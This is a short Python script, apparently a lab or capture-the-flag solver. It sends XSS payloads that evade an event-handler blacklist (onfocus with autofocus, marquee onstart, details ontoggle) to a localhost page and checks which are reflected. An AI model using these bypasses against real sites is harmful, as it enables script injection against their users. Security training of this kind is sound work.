import urllib.request, sys
port = sys.argv[1] if len(sys.argv) > 1 else "55541"

# Blacklist: script, onload, onmouseover, onclick, onbegin, onerror, svg, '
# NOT blocked: onfocus, ontoggle, onstart, autofocus, onfocusin

payloads = [
    ("onfocus (img)", '<img src=x onfocus=alert(1) autofocus>'),
    ("onfocus (input)", '<input autofocus onfocus=alert(1)>'),
    ("marquee onstart", '<marquee onstart=alert(1)>'),
    ("details ontoggle", '<details open ontoggle=alert(1)>'),
]

for name, payload in payloads:
    encoded = urllib.parse.quote(payload)
    try:
        r = urllib.request.urlopen(
            "http://localhost:{}/page?name={}".format(port, encoded), timeout=5)
        html = r.read().decode()
        if "solution-text" in html:
            import re
            m = re.search(r"solution-text[^>]*>([^<]+)", html)
            reason = m.group(1) if m else "blocked"
            print("BLOCKED: {} - {}".format(name, reason))
        elif payload[:20] in html or payload.replace('<','&lt;') in html:
            print("PASS:    {} - payload in response".format(name))
        elif "alert" in html.lower():
            print("PASS:    {} - alert in response".format(name))
        else:
            print("?        {} - no reflection detected".format(name))
    except Exception as e:
        print("ERROR:   {} - {}".format(name, str(e)[:80]))
